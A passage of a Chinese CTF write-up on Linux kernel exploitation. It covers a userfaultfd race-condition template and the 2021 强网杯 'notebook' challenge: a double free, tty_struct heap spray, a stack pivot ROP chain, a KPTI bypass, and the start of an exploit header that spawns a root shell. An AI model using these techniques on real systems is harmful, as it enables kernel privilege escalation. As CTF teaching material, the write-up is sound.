@@ -1,0 +1,307 @@
+        uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
+        if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
+            errExit("ioctl-UFFDIO_REGISTER");
+        /* Create a thread that will process the userfaultfd events */
+        int s = pthread_create(&thr, NULL, fault_handler_thread, (void *) uffd);
+        if (s != 0)
+            errExit("pthread_create");
+        /* Trigger the userfaultfd event */
+        void * ptr = (void*) *(unsigned long long*) addr;
+        printf("Get data: %p\n", ptr);
+        return 0;
+    }
+起个虚拟机跑一下，我们可以看到在我们监视的匿名页内成功地被我们写入了想要的数据
+###  新版本内核对抗 userfaultfd 在 race condition 中的利用
+正所谓“没有万能的银弹”，可能有的人会发现在较新版本的内核中 userfaultfd 系统调用无法成功启动：
+这是因为在较新版本的内核中为 userfaultfd 添加了一些限制：
+> 来自 linux-5.11 源码`fs/userfaultfd.c`：
+    SYSCALL_DEFINE1(userfaultfd, int, flags)
+    {
+        struct userfaultfd_ctx *ctx;
+        int fd;
+        if (!sysctl_unprivileged_userfaultfd &&
+            (flags & UFFD_USER_MODE_ONLY) == 0 &&
+            !capable(CAP_SYS_PTRACE)) {
+            printk_once(KERN_WARNING "uffd: Set unprivileged_userfaultfd "
+                "sysctl knob to 1 if kernel faults must be handled "
+                "without obtaining CAP_SYS_PTRACE capability\n");
+            return -EPERM;
+        }
+    //...
+这或许意味着刚刚进入大众视野的 userfaultfd 可能又将逐渐淡出大众视野（ ~~微博@来去之间~~ ），但不可否认的是，userfaultfd
+确乎为我们在 Linux kernel 中的条件竞争利用提供了一个全新的思路与一种极其稳定的利用手法
+###  CTF 中的 userfaultfd 板子
+userfaultfd 的整个操作流程比较繁琐，故笔者现给出如下板子：
+    static pthread_t monitor_thread;
+    void errExit(char * msg)
+    {
+        printf("[x] Error at: %s\n", msg);
+        exit(EXIT_FAILURE);
+    }
+    void registerUserFaultFd(void * addr, unsigned long len, void (*handler)(void*))
+    {
+        long uffd;
+        struct uffdio_api uffdio_api;
+        struct uffdio_register uffdio_register;
+        int s;
+        /* Create and enable userfaultfd object */
+        uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
+        if (uffd == -1)
+            errExit("userfaultfd");
+        uffdio_api.api = UFFD_API;
+        uffdio_api.features = 0;
+        if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1)
+            errExit("ioctl-UFFDIO_API");
+        uffdio_register.range.start = (unsigned long) addr;
+        uffdio_register.range.len = len;
+        uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
+        if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
+            errExit("ioctl-UFFDIO_REGISTER");
+        s = pthread_create(&monitor_thread, NULL, handler, (void *) uffd);
+        if (s != 0)
+            errExit("pthread_create");
+    }
+在使用时直接调用即可：
+    registerUserFaultFd(addr, len, handler);
+需要注意的是 handler 的写法，这里直接照抄 Linux man page 改了改，可以根据个人需求进行个性化改动：
+    static char *page = NULL; // 你要拷贝进去的数据
+    static long page_size;
+    static void *
+    fault_handler_thread(void *arg)
+    {
+        static struct uffd_msg msg;
+        static int fault_cnt = 0;
+        long uffd;
+        struct uffdio_copy uffdio_copy;
+        ssize_t nread;
+        uffd = (long) arg;
+        for (;;) 
+        {
+            struct pollfd pollfd;
+            int nready;
+            pollfd.fd = uffd;
+            pollfd.events = POLLIN;
+            nready = poll(&pollfd, 1, -1);
+            /*
+             * [在这停顿.jpg]
+             * 当 poll 返回时说明出现了缺页异常
+             * 你可以在这里插入一些自定义的代码，比如说获取锁或者 sleep() 一类的操作
+             * 让他在你想要的地方停顿，之后你再手动唤醒（或者就这样卡住）
+             */
+            if (nready == -1)
+                errExit("poll");
+            nread = read(uffd, &msg, sizeof(msg));
+            if (nread == 0)
+                errExit("EOF on userfaultfd!\n");
+            if (nread == -1)
+                errExit("read");
+            if (msg.event != UFFD_EVENT_PAGEFAULT)
+                errExit("Unexpected event on userfaultfd\n");
+            uffdio_copy.src = (unsigned long) page;
+            uffdio_copy.dst = (unsigned long) msg.arg.pagefault.address &
+                                                  ~(page_size - 1);
+            uffdio_copy.len = page_size;
+            uffdio_copy.mode = 0;
+            uffdio_copy.copy = 0;
+            if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
+                errExit("ioctl-UFFDIO_COPY");
+        }
+    }
+## 0x02.强网杯2021线上赛 – notebook
+###  简单分析
+首先看一下启动脚本
+    #!/bin/sh
+    stty intr ^]
+    exec timeout 300 qemu-system-x86_64 -m 64M -kernel bzImage -initrd rootfs.cpio -append "loglevel=3 console=ttyS0 oops=panic panic=1 kaslr" -nographic -net user -net nic -device e1000 -smp cores=2,threads=2 -cpu kvm64,+smep,+smap -monitor /dev/null 2>/dev/null -s
+开了 smap、smep、kaslr 保护
+查看 `/sys/devices/system/cpu/vulnerabilities/`
+开启了 KPTI （内核页表隔离）
+给了一个 LKM 叫 `notebook.ko`，按惯例这应当就是有漏洞的模块了，拖入 IDA 进行分析
+大致是创建了一个 misc 类型的设备，并自定义了 ioctl、read、write 三个接口
+**1）note 结构体**
+定义了一个结构体 `note`，有着两个成员：size 存储 cache 的大小，buf 存储指向对应 cache 的指针
+    typedef struct
+    {
+        size_t size;
+        char * buf;
+    }note;
+**2）mynote_ioctl**
+对于 ioctl 通信，该模块模拟了一个菜单（ ~~又是菜单堆~~ ），提供了创建、编辑、释放内存的功能
+我们需要传入的参数为如下结构体：
+    typedef struct 
+    {
+        size_t idx;
+        size_t size;
+        char * buf;
+    }userarg;
+**noteadd()**
+noteadd() 会向 slub 申请 object，其中限制了我们只能够分配 0x60 以下的 note，此时不会直接将用户数据拷贝到刚分配的 note
+中，而是拷贝到全局变量字符数组 `name` 中
+**notedel()**
+这个函数主要用处是释放先前分配的 note
+注意到在 notedel() 函数中若是 size 为 0 则不会清空，不过与 ptmalloc 所不同的是，kmalloc(0) 并不会返回 object
+这里还有一个读写锁，不过 add 和 edit 占用的是 **读** 位，而 delete 占用的是 **写**
+位，通俗地说便是：读锁可以被多个进程使用，多个进程此时可以同时进入临界区，而写锁只能被一个进程使用，只有一个进程能够进入临界区
+**noteedit()**
+编辑我们的 notebook 中的 object，若是 size 不同则会调用 krealloc，并将用户空间数据拷贝 256 字节至全局变量 name
+中，否则直接返回，与 add 所不同的是 edit 并不会限制 size 大小，因此 **虽然 add 限制了 size，但是通过 edit
+我们仍能获得任意大小的 object**
+在这里存在一个漏洞：edit 使用的是读锁，可以多个进程并发 `realloc(buf, 0)` ，通过条件竞争达到 double free 的效果
+**notegift()**
+notegift() 函数会白给出分配的 note 的地址
+**3）mynote_read**
+很普通的读取对应 note 内容的功能，读取的大小为 notebook 结构体数组中存的 size，下标为 read 传入的第三个参数
+**4）mynote_write**
+很普通的写入对应 note 内容的功能，写入的大小为 notebook 结构体数组中存的 size，下标为 write 传入的第三个参数
+###  解法一：userfaultfd + heap spray + Kernel UAF + stack migration + KPTI bypass
+**1）userfaultfd 构造 UAF**
+考虑到在 mynote_edit 当中使用了 krealloc 来重分配 object，随后使用 copy_fom_user
+从用户空间拷贝数据，那么这里我们可以先分配一个 tty_struct 大小的 note，之后 **新开 edit 线程通过 krealloc
+一个较大的数将其释放** ，并通过 userfaultfd 让 mynote_edit 卡在这里， **此时 notebook 数组中的 object
+尚未被清空，仍是原先被释放了的 object**
+接下来我们进行 **堆喷射** ：多次打开 `/dev/ptmx`，由此我们便有可能 **将刚释放的 object 申请到 tty_struct 中**
+但在 read 和 write 中都会用 `_check_object_size` 检查 size 与 buf 大小是否匹配，在 mynote_add
+当中限制了 size 应当不大于 0x60，而我们在 mynote_edit 中的释放操作之前会将 size 改掉
+考虑到在 mynote_add 中先用 copy_from_user 拷贝数据后才调用 kmalloc，故这里还是可以新开 add 线程让 size
+合法后通过 userfaultfd 让其卡在这里
+> 我们可以通过检查 object 开头的数据是否为 tty 魔数 `0x5401` 判断是否分配到了 tty_struct
+**2）泄露内核地址**
+由于我们已经获得了一个 tty_struct，故可以直接通过 tty_struct 中的 tty_operations 泄露地址
+**ptm_unix98_ops&& pty_unix98_ops**
+在 ptmx 被打开时内核通过 `alloc_tty_struct()` 分配 tty_struct 的内存空间，之后会将 tty_operations
+初始化为 **全局变量** `ptm_unix98_ops` 或 `pty_unix98_ops`，在调试阶段我们可以先关掉 kaslr 开 root 从
+`/proc/kallsyms` 中读取其偏移
+开启了 kaslr 的内核在内存中的偏移依然以内存页为粒度，故我们可以通过比对 tty_operations 地址的低三16进制位来判断是
+ptm_unix98_ops 还是 pty_unix98_ops
+**3）劫持 tty_operations**
+由于题目开启了 smap 保护，我们不能够直接将 fake tty_operations 放置到用户空间当中，但 notegift() 会白给出
+notebook 里存的 note 的地址，那么我们可以把 fake tty_operations 布置到 note 当中
+接下来进行栈迁移的工作，我们这里考虑劫持 tty_operations->write，简单下个断点看看环境：
+可以发现当程序运行到这里时 rdi 寄存器中存储的刚好是 tty_struct 的地址，笔者选择通过下面这条 gadget 将栈迁移到
+tty_struct：
+tty_struct 比较小，而且很多数据不能动，这里笔者再进行第二次栈迁移迁回 tty_operations：
+tty_operation 开头到 write 的空间比较小，笔者选择再进行第三次栈迁移到一个 note 中，在那里完成我们的 ROP
+        // first migration to tty_struct
+        ((struct tty_operations *)fake_tty_ops_data)->write = PUSH_RDI_POP_RSP_POP_RBP_ADD_RAX_RDX_RET + kernel_offset;
+        // second migration back to tty_operations
+        fake_tty_data[1] = POP_RBX_POP_RBP_RET + kernel_offset;
+        fake_tty_data[3] = notebook[fake_tty_ops_idx].buf;
+        fake_tty_data[4] = MOV_RSP_RBP_POP_RBP_RET + kernel_offset;
+        // third migration to a note
+        fake_tty_ops_data[1] = POP_RBP_RET + kernel_offset;
+        fake_tty_ops_data[2] = notebook[fake_stack_idx].buf;
+        fake_tty_ops_data[3] = MOV_RSP_RBP_POP_RBP_RET + kernel_offset;
+**4）KPTI bypass**
+由于开启了 KPTI（内核页表隔离），故我们在返回用户态之前还需要将我们的用户进程的页表给切换回来
+众所周知 Linux 采用 **四级页表** 结构（PGD->PUD->PMD->PTE），而 CR3 控制寄存器用以存储当前的 PGD 的地址，因此在开启
+KPTI 的情况下用户态与内核态之间的切换便涉及到 CR3 的切换，为了提高切换的速度，内核将内核空间的 PGD 与用户空间的 PGD
+两张页全局目录表放在一段连续的内存中（两张表，一张一页4k，总计8k，内核空间的在低地址，用户空间的在高地址），这样 **只需要将 CR3 的第 13
+位取反便能完成页表切换的操作**
+内核也相应地在 `arch/x86/entry/entry_64.S` 中提供了一个用于完成内核态到用户态切换的函数
+`swapgs_restore_regs_and_return_to_usermode`，地址可以在 `/proc/kallsyms` 中获得
+AT&T 汇编比较反人类，推荐直接查看 IDA 的反汇编结果：
+在实际操作时前面的一些栈操作都可以跳过，直接从 `mov rdi, rsp` 开始，这个函数大概可以总结为如下操作：
+    mov        rdi, cr3
+    or         rdi, 0x1000
+    mov     cr3, rdi
+    pop        rax
+    pop        rdi
+    swapgs
+    iretq
+因此我们只需要布置出如下栈布局即可：
+    ↓    swapgs_restore_regs_and_return_to_usermode
+        0 // padding
+        0 // padding
+        user_shell_addr
+        user_cs
+        user_rflags
+        user_sp
+        user_ss
+最终的 exp 如下：
+> kernelpwn.h
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    void * kernel_base = 0xffffffff81000000;
+    size_t kernel_offset = 0;
+    static pthread_t monitor_thread;
+    void errExit(char * msg)
+    {
+        printf("\033[31m\033[1m[x] Error at: \033[0m%s\n", msg);
+        exit(EXIT_FAILURE);
+    }
+    void registerUserFaultFd(void * addr, unsigned long len, void (*handler)(void*))
+    {
+        long uffd;
+        struct uffdio_api uffdio_api;
+        struct uffdio_register uffdio_register;
+        int s;
+        /* Create and enable userfaultfd object */
+        uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
+        if (uffd == -1)
+            errExit("userfaultfd");
+        uffdio_api.api = UFFD_API;
+        uffdio_api.features = 0;
+        if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1)
+            errExit("ioctl-UFFDIO_API");
+        uffdio_register.range.start = (unsigned long) addr;
+        uffdio_register.range.len = len;
+        uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
+        if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
+            errExit("ioctl-UFFDIO_REGISTER");
+        s = pthread_create(&monitor_thread, NULL, handler, (void *) uffd);
+        if (s != 0)
+            errExit("pthread_create");
+    }
+    size_t user_cs, user_ss, user_rflags, user_sp;
+    void saveStatus()
+    {
+        __asm__("mov user_cs, cs;"
+                "mov user_ss, ss;"
+                "mov user_sp, rsp;"
+                "pushf;"
+                "pop user_rflags;"
+                );
+        printf("\033[34m\033[1m[*] Status has been saved.\033[0m\n");
+    }
+    size_t commit_creds = NULL, prepare_kernel_cred = NULL;
+    void getRootPrivilige(void)
+    {
+        void * (*prepare_kernel_cred_ptr)(void *) = prepare_kernel_cred;
+        int (*commit_creds_ptr)(void *) = commit_creds;
+        (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(NULL));
+    }
+    void getRootShell(void)
+    {   
+        puts("\033[32m\033[1m[+] Backing from the kernelspace.\033[0m");
+        if(getuid())
+        {
+            puts("\033[31m\033[1m[x] Failed to get the root!\033[0m");
+            exit(-1);
+        }
+        puts("\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m");
+        system("/bin/sh");
+    }
+    /* ------ kernel structure ------ */
+    struct file_operations;
+    struct tty_struct;
+    struct tty_driver;
+    struct serial_icounter_struct;
+    struct tty_operations {
+        struct tty_struct * (*lookup)(struct tty_driver *driver,
+                struct file *filp, int idx);
+        int  (*install)(struct tty_driver *driver, struct tty_struct *tty);
